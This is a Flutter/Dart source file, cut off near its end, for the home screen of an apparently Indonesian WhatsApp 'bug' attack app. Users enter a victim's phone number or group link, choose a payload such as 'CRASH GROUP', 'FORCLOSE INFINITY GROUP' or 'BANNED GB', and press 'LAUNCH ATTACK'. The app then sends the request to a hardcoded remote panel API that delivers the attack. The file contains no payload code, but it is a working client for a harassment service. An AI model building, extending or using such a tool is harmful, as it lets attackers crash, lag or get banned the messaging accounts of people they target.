import 'dart:async';
import 'dart:convert';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

// ============================================================
// 🎨 DESIGN SYSTEM
// ============================================================
class AppColors {
  static const Color bg0 = Color(0xFF0A0A0C);
  static const Color bg1 = Color(0xFF121216);
  static const Color bg2 = Color(0xFF1A1A20);
  static const Color bg3 = Color(0xFF22222A);
  static const Color bgElevated = Color(0xFF2A2A33);

  static const Color text0 = Color(0xFFFFFFFF);
  static const Color text1 = Color(0xFFE4E4E7);
  static const Color text2 = Color(0xFFA1A1AA);
  static const Color text3 = Color(0xFF71717A);

  static const Color red400 = Color(0xFFF87171);
  static const Color red500 = Color(0xFFEF4444);
  static const Color red600 = Color(0xFFDC2626);
  static const Color red700 = Color(0xFFB91C1C);

  static const Color success = Color(0xFF4ADE80);

  static const Color border1 = Color(0x0FFFFFFF);
  static const Color border2 = Color(0x1AFFFFFF);
  static const Color border3 = Color(0x26FFFFFF);
}

// ============================================================
// 📊 MODEL
// ============================================================
class BugItem {
  final String bugId;
  final String bugName;

  BugItem({required this.bugId, required this.bugName});
}

// ============================================================
// 📱 HOME PAGE
// ============================================================
class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage>
    with SingleTickerProviderStateMixin {
  static const String API_BASE = 'http://freepanelbygua.panel-xsat.my.id:3655';

  // --- Controllers ---
  final targetController = TextEditingController();
  late PageController _carouselController;
  VideoPlayerController? _videoController;

  // --- State ---
  String _selectedBugMode = 'number';
  String _senderMode = 'private';
  String selectedBugId = '';
  int currentBugIndex = 0;
  List<BugItem> availableBugs = [];
  bool isSending = false;
  int privateSenderCount = 0;
  int globalSenderCount = 0;

  // --- Animations ---
  late AnimationController _pulseController;

  // --- Static bug list (fallback) ---
  final List<BugItem> _defaultListBug = [
    BugItem(bugId: 'lockgbjir', bugName: '[BANNED GB!!]'),
    BugItem(bugId: 'android_group', bugName: '[FORCLOSE INFINITY GROUP!!]'),
    BugItem(bugId: 'lock_group', bugName: '[DELAY GROUP!!]'),
    BugItem(bugId: 'roid_group', bugName: '[CRASH GROUP!!]'),
    BugItem(bugId: 'verse_group', bugName: '[Blank GROUP!!]'),
    BugItem(bugId: 'homs_group', bugName: '[Band GB V1]'),
    BugItem(bugId: 'xexe_v2', bugName: '[Band GB V2]'),
    BugItem(bugId: 'carnoss', bugName: '[Band GB V3]'),
  ];

  @override
  void initState() {
    super.initState();

    _carouselController = PageController(viewportFraction: 0.78);
    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _initVideo();
    _initBugs();
    _fetchSenderStats();
  }

  @override
  void dispose() {
    _videoController?.dispose();
    _pulseController.dispose();
    _carouselController.dispose();
    targetController.dispose();
    super.dispose();
  }

  // ============================================================
  // 🎬 VIDEO
  // ============================================================
  void _initVideo() {
    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        if (!mounted) return;
        setState(() {});
        _videoController?.setVolume(0);
        _videoController?.setLooping(true);
        _videoController?.play();
      }).catchError((_) {
        // Silent fail
      });
  }

  // ============================================================
  // 🐛 BUGS
  // ============================================================
  void _initBugs() {
    if (widget.listBug.isNotEmpty) {
      _defaultListBug.clear();
      for (var b in widget.listBug) {
        _defaultListBug.add(BugItem(
          bugId: b['bug_id']?.toString() ?? '',
          bugName: b['bug_name']?.toString() ?? '',
        ));
      }
    }
    _refreshBugs();
  }

  List<BugItem> _getFilteredBugs() {
    if (_selectedBugMode == 'group') {
      return _defaultListBug
          .where((b) => b.bugId.contains('_group'))
          .toList();
    } else {
      return _defaultListBug
          .where((b) => !b.bugId.contains('_group'))
          .toList();
    }
  }

  void _refreshBugs() {
    availableBugs = _getFilteredBugs();
    currentBugIndex = 0;
    selectedBugId = availableBugs.isNotEmpty ? availableBugs[0].bugId : '';
    setState(() {});
  }

  // ============================================================
  // 📊 SENDER STATS
  // ============================================================
  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(
        Uri.parse('$API_BASE/getSenderStats?key=${widget.sessionKey}'),
      );
      final data = jsonDecode(res.body);
      if (data['valid'] == true) {
        setState(() {
          privateSenderCount = data['private'] ?? 0;
          globalSenderCount = data['global'] ?? 0;
        });
      }
    } catch (_) {
      // Silent fail
    }
  }

  // ============================================================
  // 🔧 HELPERS
  // ============================================================
  String _cleanBugName(String name) {
    return name
        .replaceAll(RegExp(r'^bug_|_group$'), '')
        .replaceAll('_', ' ')
        .toUpperCase();
  }

  bool _isOwnerRole() {
    return ['owner', 'vip', 'moderator'].contains(widget.role.toLowerCase());
  }

  void _haptic() {
    HapticFeedback.selectionClick();
  }

  // ============================================================
  // 🎨 BUILD
  // ============================================================
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.bg0,
      body: Container(
        decoration: BoxDecoration(
          gradient: RadialGradient(
            center: const Alignment(0, -1),
            radius: 1.5,
            colors: [
              AppColors.red500.withOpacity(0.12),
              Colors.transparent,
            ],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            physics: const BouncingScrollPhysics(),
            padding: const EdgeInsets.fromLTRB(16, 16, 16, 40),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                _buildHeaderCard(),
                const SizedBox(height: 24),
                _buildTargetBtn(),
                const SizedBox(height: 20),
                _buildTargetInput(),
                _buildPayloadSection(),
                if (_isOwnerRole()) _buildSenderMode(),
                _buildLaunchBtn(),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ============================================================
  // 🎬 HEADER CARD
  // ============================================================
  Widget _buildHeaderCard() {
    return Container(
      height: 200,
      decoration: BoxDecoration(
        color: AppColors.bg1,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: AppColors.border1),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.6),
            blurRadius: 32,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(24),
        child: Stack(
          fit: StackFit.expand,
          children: [
            // Video background
            if (_videoController != null &&
                _videoController!.value.isInitialized)
              FadeInImage.assetNetwork(
                placeholder: 'assets/images/placeholder.png',
                image: '',
                fit: BoxFit.cover,
                imageErrorBuilder: (_, __, ___) => _buildVideoBg(),
              )
            else
              _buildVideoBg(),

            // Gradient overlay
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    AppColors.bg0.withOpacity(0.2),
                    AppColors.bg0.withOpacity(0.5),
                    AppColors.bg0.withOpacity(0.95),
                  ],
                  stops: const [0, 0.5, 1],
                ),
              ),
            ),

            // Content
            Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              widget.username.toUpperCase(),
                              style: const TextStyle(
                                color: Colors.white,
                                fontSize: 20,
                                fontWeight: FontWeight.w700,
                                letterSpacing: -0.5,
                                height: 1.1,
                              ),
                            ),
                            const SizedBox(height: 6),
                            _buildRoleChip(),
                          ],
                        ),
                      ),
                      _buildStatusDot(),
                    ],
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    crossAxisAlignment: CrossAxisAlignment.end,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text(
                            'SISA MASA BERLAKU',
                            style: TextStyle(
                              color: AppColors.text3,
                              fontSize: 9,
                              fontWeight: FontWeight.w600,
                              letterSpacing: 1.2,
                            ),
                          ),
                          const SizedBox(height: 4),
                          Text(
                            widget.expiredDate,
                            style: const TextStyle(
                              color: AppColors.text0,
                              fontSize: 14,
                              fontWeight: FontWeight.w600,
                              fontFamily: 'monospace',
                            ),
                          ),
                        ],
                      ),
                      _buildActiveBadge(),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildVideoBg() {
    return Container(
      color: AppColors.bg2,
      child: Center(
        child: Icon(
          Icons.videocam_outlined,
          color: AppColors.text3.withOpacity(0.3),
          size: 60,
        ),
      ),
    );
  }

  Widget _buildRoleChip() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
      decoration: BoxDecoration(
        color: AppColors.red500.withOpacity(0.15),
        borderRadius: BorderRadius.circular(999),
        border: Border.all(color: AppColors.red500.withOpacity(0.3)),
      ),
      child: Text(
        widget.role.toUpperCase(),
        style: const TextStyle(
          color: AppColors.red400,
          fontSize: 10,
          fontWeight: FontWeight.w600,
          letterSpacing: 0.8,
          fontFamily: 'monospace',
        ),
      ),
    );
  }

  Widget _buildStatusDot() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        color: const Color(0xFF22C55E).withOpacity(0.1),
        borderRadius: BorderRadius.circular(999),
        border: Border.all(color: const Color(0xFF22C55E).withOpacity(0.25)),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 6,
            height: 6,
            decoration: const BoxDecoration(
              color: AppColors.success,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(color: AppColors.success, blurRadius: 8),
              ],
            ),
          ),
          const SizedBox(width: 6),
          const Text(
            'ONLINE',
            style: TextStyle(
              color: AppColors.success,
              fontSize: 10,
              fontWeight: FontWeight.w600,
              letterSpacing: 0.8,
              fontFamily: 'monospace',
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildActiveBadge() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
      decoration: BoxDecoration(
        color: const Color(0xFF22C55E).withOpacity(0.15),
        borderRadius: BorderRadius.circular(999),
        border: Border.all(color: const Color(0xFF22C55E).withOpacity(0.3)),
      ),
      child: const Text(
        '● ACTIVE',
        style: TextStyle(
          color: AppColors.success,
          fontSize: 10,
          fontWeight: FontWeight.w600,
          letterSpacing: 0.8,
          fontFamily: 'monospace',
        ),
      ),
    );
  }

  // ============================================================
  // 🎯 TARGET TYPE BUTTON
  // ============================================================
  Widget _buildTargetBtn() {
    final isNumber = _selectedBugMode == 'number';
    return GestureDetector(
      onTap: _showTargetTypeModal,
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: AppColors.bg1,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: AppColors.border2),
        ),
        child: Row(
          children: [
            Container(
              width: 44,
              height: 44,
              decoration: BoxDecoration(
                color: AppColors.red500.withOpacity(0.1),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: AppColors.red500.withOpacity(0.25)),
              ),
              child: Center(
                child: Text(
                  isNumber ? '📱' : '👥',
                  style: const TextStyle(fontSize: 20),
                ),
              ),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'TARGET TYPE',
                    style: TextStyle(
                      color: AppColors.text3,
                      fontSize: 10,
                      fontWeight: FontWeight.w600,
                      letterSpacing: 1.5,
                    ),
                  ),
                  const SizedBox(height: 3),
                  Text(
                    isNumber ? 'Bug Nomor' : 'Bug Group',
                    style: const TextStyle(
                      color: AppColors.text0,
                      fontSize: 15,
                      fontWeight: FontWeight.w600,
                      letterSpacing: -0.2,
                    ),
                  ),
                ],
              ),
            ),
            const Icon(
              Icons.chevron_right,
              color: AppColors.text3,
              size: 20,
            ),
          ],
        ),
      ),
    );
  }

  // ============================================================
  // ⌨️ TARGET INPUT
  // ============================================================
  Widget _buildTargetInput() {
    final isNumber = _selectedBugMode == 'number';
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Padding(
          padding: const EdgeInsets.only(left: 4, bottom: 10),
          child: Text(
            isNumber ? 'TARGET NUMBER' : 'WHATSAPP GROUP LINK',
            style: const TextStyle(
              color: AppColors.text2,
              fontSize: 11,
              fontWeight: FontWeight.w600,
              letterSpacing: 1.5,
            ),
          ),
        ),
        Container(
          decoration: BoxDecoration(
            color: AppColors.bg1,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: AppColors.border2),
          ),
          child: TextField(
            controller: targetController,
            style: const TextStyle(
              color: AppColors.text0,
              fontSize: 14,
              fontWeight: FontWeight.w500,
              fontFamily: 'monospace',
            ),
            cursorColor: AppColors.red500,
            keyboardType:
                isNumber ? TextInputType.phone : TextInputType.url,
            decoration: InputDecoration(
              hintText: isNumber
                  ? '+628xxxxxxxx'
                  : 'https://chat.whatsapp.com/...',
              hintStyle: const TextStyle(
                color: AppColors.text3,
                fontSize: 14,
                fontWeight: FontWeight.w400,
              ),
              prefixIcon: Padding(
                padding: const EdgeInsets.only(left: 18, right: 12),
                child: Center(
                  widthFactor: 1,
                  child: Text(
                    isNumber ? '📱' : '🔗',
                    style: const TextStyle(fontSize: 18),
                  ),
                ),
              ),
              border: InputBorder.none,
              contentPadding:
                  const EdgeInsets.symmetric(vertical: 18, horizontal: 16),
            ),
          ),
        ),
      ],
    );
  }

  // ============================================================
  // 🎠 PAYLOAD SECTION
  // ============================================================
  Widget _buildPayloadSection() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.symmetric(vertical: 20),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              const Padding(
                padding: EdgeInsets.only(left: 4),
                child: Text(
                  'SELECT PAYLOAD',
                  style: TextStyle(
                    color: AppColors.text2,
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 2,
                  ),
                ),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(
                  color: AppColors.bg2,
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: AppColors.border1),
                ),
                child: Text(
                  availableBugs.isEmpty
                      ? '0 / 0'
                      : '${currentBugIndex + 1} / ${availableBugs.length}',
                  style: const TextStyle(
                    color: AppColors.text3,
                    fontSize: 11,
                    fontWeight: FontWeight.w600,
                    fontFamily: 'monospace',
                  ),
                ),
              ),
            ],
          ),
        ),
        if (availableBugs.isEmpty)
          Container(
            padding: const EdgeInsets.symmetric(vertical: 40, horizontal: 20),
            decoration: BoxDecoration(
              color: AppColors.bg1,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: AppColors.border2),
            ),
            child: const Center(
              child: Text(
                'No payload available',
                style: TextStyle(color: AppColors.text3, fontSize: 13),
              ),
            ),
          )
        else ...[
          SizedBox(
            height: 140,
            child: PageView.builder(
              controller: _carouselController,
              itemCount: availableBugs.length,
              onPageChanged: (i) {
                _haptic();
                setState(() {
                  currentBugIndex = i;
                  selectedBugId = availableBugs[i].bugId;
                });
              },
              itemBuilder: (ctx, i) {
                final bug = availableBugs[i];
                final isSelected = i == currentBugIndex;
                final isGroup = bug.bugId.contains('_group');
                return AnimatedContainer(
                  duration: const Duration(milliseconds: 300),
                  margin: const EdgeInsets.symmetric(horizontal: 6),
                  transform: Matrix4.identity()..scale(isSelected ? 1.02 : 1.0),
                  transformAlignment: Alignment.center,
                  decoration: BoxDecoration(
                    gradient: isSelected
                        ? LinearGradient(
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight,
                            colors: [
                              AppColors.red500.withOpacity(0.12),
                              AppColors.bg2,
                            ],
                          )
                        : null,
                    color: isSelected ? null : AppColors.bg1,
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(
                      color: isSelected ? AppColors.red500 : AppColors.border2,
                      width: isSelected ? 1.5 : 1,
                    ),
                    boxShadow: isSelected
                        ? [
                            BoxShadow(
                              color: AppColors.red500.withOpacity(0.2),
                              blurRadius: 24,
                              offset: const Offset(0, 8),
                            ),
                          ]
                        : [],
                  ),
                  child: Padding(
                    padding: const EdgeInsets.all(16),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 8, vertical: 4),
                              decoration: BoxDecoration(
                                color: isGroup
                                    ? const Color(0xFFFB923C).withOpacity(0.12)
                                    : AppColors.red500.withOpacity(0.12),
                                borderRadius: BorderRadius.circular(6),
                                border: Border.all(
                                  color: isGroup
                                      ? const Color(0xFFFB923C).withOpacity(0.25)
                                      : AppColors.red500.withOpacity(0.25),
                                ),
                              ),
                              child: Text(
                                isGroup ? '👥 GROUP' : '📱 NUMBER',
                                style: TextStyle(
                                  color: isGroup
                                      ? const Color(0xFFFB923C)
                                      : AppColors.red400,
                                  fontSize: 9,
                                  fontWeight: FontWeight.w600,
                                  letterSpacing: 0.5,
                                  fontFamily: 'monospace',
                                ),
                              ),
                            ),
                          ],
                        ),
                        Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Text(
                              _cleanBugName(bug.bugName),
                              style: TextStyle(
                                color: isSelected
                                    ? AppColors.red400
                                    : AppColors.text0,
                                fontSize: 15,
                                fontWeight: FontWeight.w600,
                                height: 1.35,
                                letterSpacing: -0.3,
                              ),
                              maxLines: 2,
                              overflow: TextOverflow.ellipsis,
                            ),
                            const SizedBox(height: 6),
                            Text(
                              bug.bugId,
                              style: TextStyle(
                                color: isSelected
                                    ? AppColors.red400.withOpacity(0.7)
                                    : AppColors.text3,
                                fontSize: 10,
                                fontFamily: 'monospace',
                              ),
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                            ),
                          ],
                        ),
                      ],
                    ),
                  ),
                );
              },
            ),
          ),
          const SizedBox(height: 16),
          // Dots
          Wrap(
            alignment: WrapAlignment.center,
            spacing: 6,
            children: List.generate(availableBugs.length, (i) {
              final isActive = i == currentBugIndex;
              return GestureDetector(
                onTap: () {
                  _carouselController.animateToPage(
                    i,
                    duration: const Duration(milliseconds: 300),
                    curve: Curves.easeInOut,
                  );
                },
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 300),
                  width: isActive ? 20 : 6,
                  height: 6,
                  decoration: BoxDecoration(
                    color: isActive ? AppColors.red500 : AppColors.bg3,
                    borderRadius: BorderRadius.circular(3),
                    boxShadow: isActive
                        ? [
                            BoxShadow(
                              color: AppColors.red500.withOpacity(0.6),
                              blurRadius: 12,
                            ),
                          ]
                        : [],
                  ),
                ),
              );
            }),
          ),
          const SizedBox(height: 24),
        ],
      ],
    );
  }

  // ============================================================
  // 👤 SENDER MODE
  // ============================================================
  Widget _buildSenderMode() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        const Padding(
          padding: EdgeInsets.only(left: 4, bottom: 10),
          child: Text(
            'SENDER MODE',
            style: TextStyle(
              color: AppColors.text2,
              fontSize: 11,
              fontWeight: FontWeight.w700,
              letterSpacing: 2,
            ),
          ),
        ),
        Container(
          padding: const EdgeInsets.all(4),
          decoration: BoxDecoration(
            color: AppColors.bg1,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: AppColors.border1),
          ),
          child: Row(
            children: [
              Expanded(
                child: _buildSenderBtn(
                  label: 'Private',
                  icon: '👤',
                  count: privateSenderCount,
                  isActive: _senderMode == 'private',
                  onTap: () {
                    _haptic();
                    setState(() => _senderMode = 'private');
                  },
                ),
              ),
              const SizedBox(width: 4),
              Expanded(
                child: _buildSenderBtn(
                  label: 'Global',
                  icon: '🌐',
                  count: globalSenderCount,
                  isActive: _senderMode == 'global',
                  onTap: () {
                    _haptic();
                    setState(() => _senderMode = 'global');
                  },
                ),
              ),
            ],
          ),
        ),
        const SizedBox(height: 24),
      ],
    );
  }

  Widget _buildSenderBtn({
    required String label,
    required String icon,
    required int count,
    required bool isActive,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 250),
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: isActive ? AppColors.bg3 : Colors.transparent,
          borderRadius: BorderRadius.circular(12),
        ),
        child: Stack(
          children: [
            if (isActive)
              Positioned(
                top: 0,
                left: 0,
                right: 0,
                child: Align(
                  alignment: Alignment.topCenter,
                  child: Container(
                    width: 40,
                    height: 2,
                    decoration: BoxDecoration(
                      color: AppColors.red500,
                      borderRadius: const BorderRadius.vertical(
                          bottom: Radius.circular(2)),
                      boxShadow: [
                        BoxShadow(
                          color: AppColors.red500.withOpacity(0.6),
                          blurRadius: 8,
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            Column(
              children: [
                Text(icon, style: const TextStyle(fontSize: 18)),
                const SizedBox(height: 4),
                Text(
                  label.toUpperCase(),
                  style: TextStyle(
                    color: isActive ? AppColors.text0 : AppColors.text3,
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 1,
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  '$count',
                  style: TextStyle(
                    color: isActive
                        ? AppColors.red400
                        : AppColors.text3.withOpacity(0.7),
                    fontSize: 11,
                    fontWeight: FontWeight.w600,
                    fontFamily: 'monospace',
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ============================================================
  // 🚀 LAUNCH BUTTON
  // ============================================================
  Widget _buildLaunchBtn() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (ctx, child) {
        final glowOpacity = 0.3 + (_pulseController.value * 0.15);
        return Container(
          margin: const EdgeInsets.only(bottom: 32),
          height: 58,
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [AppColors.red600, AppColors.red700],
            ),
            borderRadius: BorderRadius.circular(16),
            boxShadow: [
              BoxShadow(
                color: AppColors.red500.withOpacity(glowOpacity),
                blurRadius: 24,
                offset: const Offset(0, 8),
              ),
              BoxShadow(
                color: Colors.black.withOpacity(0.3),
                blurRadius: 6,
                offset: const Offset(0, 2),
              ),
            ],
          ),
          child: Material(
            color: Colors.transparent,
            borderRadius: BorderRadius.circular(16),
            child: InkWell(
              onTap: isSending ? null : _sendBug,
              borderRadius: BorderRadius.circular(16),
              child: Center(
                child: isSending
                    ? const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          SizedBox(
                            width: 20,
                            height: 20,
                            child: CircularProgressIndicator(
                              color: Colors.white,
                              strokeWidth: 2.5,
                            ),
                          ),
                          SizedBox(width: 10),
                          Text(
                            'MENGIRIM...',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 14,
                              fontWeight: FontWeight.w700,
                              letterSpacing: 2,
                            ),
                          ),
                        ],
                      )
                    : const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Text('🚀', style: TextStyle(fontSize: 16)),
                          SizedBox(width: 10),
                          Text(
                            'LAUNCH ATTACK',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 14,
                              fontWeight: FontWeight.w700,
                              letterSpacing: 2,
                            ),
                          ),
                        ],
                      ),
              ),
            ),
          ),
        );
      },
    );
  }

  // ============================================================
  // 🔔 TARGET TYPE MODAL
  // ============================================================
  void _showTargetTypeModal() {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (ctx) => Container(
        padding: const EdgeInsets.fromLTRB(20, 24, 20, 32),
        decoration: const BoxDecoration(
          color: AppColors.bg1,
          borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
          border: Border(top: BorderSide(color: AppColors.border2)),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 40,
              height: 4,
              decoration: BoxDecoration(
                color: AppColors.bg3,
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            const SizedBox(height: 20),
            const Text(
              'Pilih Mode Target',
              style: TextStyle(
                color: AppColors.text0,
                fontSize: 17,
                fontWeight: FontWeight.w700,
                letterSpacing: -0.2,
              ),
            ),
            const SizedBox(height: 20),
            _buildModalOption(
              label: '📱 Bug Nomor',
              isSelected: _selectedBugMode == 'number',
              onTap: () {
                setState(() {
                  _selectedBugMode = 'number';
                  targetController.clear();
                });
                _refreshBugs();
                Navigator.pop(ctx);
                _haptic();
              },
            ),
            const SizedBox(height: 10),
            _buildModalOption(
              label: '👥 Bug Group',
              isSelected: _selectedBugMode == 'group',
              onTap: () {
                setState(() {
                  _selectedBugMode = 'group';
                  targetController.clear();
                });
                _refreshBugs();
                Navigator.pop(ctx);
                _haptic();
              },
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildModalOption({
    required String label,
    required bool isSelected,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          gradient: isSelected
              ? LinearGradient(
                  colors: [
                    AppColors.red500.withOpacity(0.15),
                    AppColors.red500.withOpacity(0.05),
                  ],
                )
              : null,
          color: isSelected ? null : AppColors.bg2,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: isSelected ? AppColors.red500 : AppColors.border1,
            width: isSelected ? 1.5 : 1,
          ),
        ),
        child: Row(
          children: [
            Text(
              label,
              style: TextStyle(
                color: isSelected ? AppColors.red400 : AppColors.text1,
                fontSize: 14,
                fontWeight: FontWeight.w600,
              ),
            ),
            const Spacer(),
            AnimatedScale(
              scale: isSelected ? 1.0 : 0.5,
              duration: const Duration(milliseconds: 250),
              child: AnimatedOpacity(
                opacity: isSelected ? 1 : 0,
                duration: const Duration(milliseconds: 250),
                child: Container(
                  width: 22,
                  height: 22,
                  decoration: const BoxDecoration(
                    color: AppColors.red500,
                    shape: BoxShape.circle,
                  ),
                  child: const Icon(
                    Icons.check,
                    color: Colors.white,
                    size: 14,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ============================================================
  // 🚀 SEND BUG
  // ============================================================
  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == 'number') {
      final cleaned = rawInput.replaceAll(RegExp(r'[^\d+]'), '');
      if (!cleaned.startsWith('+') || cleaned.length < 8) {
        _showAlert('❌', 'Invalid Number',
            'Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.');
        return;
      }
    } else {
      if (!rawInput.contains('chat.whatsapp.com') ||
          !rawInput.contains('https://')) {
        _showAlert('❌', 'Invalid Link',
            'Masukkan link group WA yang valid.');
        return;
      }
    }

    if (!availableBugs.any((b) => b.bugId == selectedBugId)) {
      _showAlert('❌', 'Error', 'Tidak ada bug tersedia.');
      return;
    }

    setState(() => isSending = true);

    final effectiveSenderMode = _isOwnerRole() ? _senderMode : 'private';

    try {
      final url = Uri.parse(
          '$API_BASE/sendBug?key=$key&target=${Uri.encodeComponent(rawInput)}&bug=$selectedBugId&senderMode=$effectiveSenderMode');
      final res = await http.get(url);
      final data = jsonDecode(res.body);

      if (data['cooldown'] == true) {
        _showAlert('⏳', 'Cooldown',
            'Tunggu beberapa saat sebelum mengirim lagi.');
      } else if (data['valid'] == false) {
        _showAlert('❌', 'Key Invalid',
            'Sesi Anda tidak valid. Silakan login ulang.');
      } else if (data['sended'] == false) {
        _showAlert('⚠️', 'Gagal',
            'Server sedang maintenance atau terjadi kegagalan.');
      } else {
        _showAlert('✅', 'Berhasil', 'Bug sukses dikirim ke target!');
        targetController.clear();
        _fetchSenderStats();
      }
    } catch (_) {
      _showAlert('❌', 'Error',
          'Terjadi kesalahan pada sistem. Coba lagi nanti.');
    } finally {
      if (mounted) setState(() => isSending = false);
    }
  }

  // ============================================================
  // 📢 ALERT MODAL
  // ============================================================
  void _showAlert(String icon, String title, String msg) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (ctx) => Container(
        padding: const EdgeInsets.fromLTRB(20, 24, 20, 32),
        decoration: const BoxDecoration(
          color: AppColors.bg1,
          borderRadius: BorderRadius.vertical(top: Radius.circular(24)),
          border: Border(top: BorderSide(color: AppColors.border2)),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 40,
              height: 4,
              decoration: BoxDecoration(
                color: AppColors.bg3,
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            const SizedBox(height: 20),
            Text(icon, style: const TextStyle(fontSize: 44)),
            const SizedBox(height: 16),
            Text(
              title,
              style: const TextStyle(
                color: AppColors.text0,
                fontSize: 17,
                fontWeight: FontWeight.w700,
                letterSpacing: -0.2,
              ),
            ),
            const SizedBox(height: 12),
            Text(
              msg,
              textAlign: TextAlign.center,
              style: const TextStyle(
                color: AppColors.text2,
                fontSize: 14,
                height: 1.6,
              ),
            ),
            const SizedBox(height: 24),
            SizedBox(
              width: double.infinity,
              child: ElevatedButton(
                onPressed: () => Navigator.pop(ctx),
                style: ElevatedButton.styleFrom(
                  backgroundColor: AppColors.bg3,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12),
                    side: const BorderSide(color: AppColors.border2),
                  ),
                  elevation: 0,
                  padding: const EdgeInsets.symmetric(vertical: 16),
                ),
                child: const Text(
                  'TUTUP',
                  style: TextStyle(
                    color: AppColors.text0,
                    fontSize: 13,
